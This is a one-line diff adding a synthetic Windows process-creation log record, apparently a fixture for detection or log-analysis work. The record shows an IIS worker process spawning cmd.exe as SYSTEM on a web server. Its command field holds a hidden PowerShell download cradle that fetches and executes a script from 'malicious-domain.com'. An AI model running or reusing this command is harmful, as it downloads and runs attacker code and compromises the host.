@@ -1,0 +1,1 @@
+{"time": "2026-06-14T14:05:00.000Z", "EventID": 1, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\w3wp.exe", "User": "NT AUTHORITY\\SYSTEM", "Computer": "prod-web-srv-04", "SourceIP": "192.168.10.45", "Command": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')"}
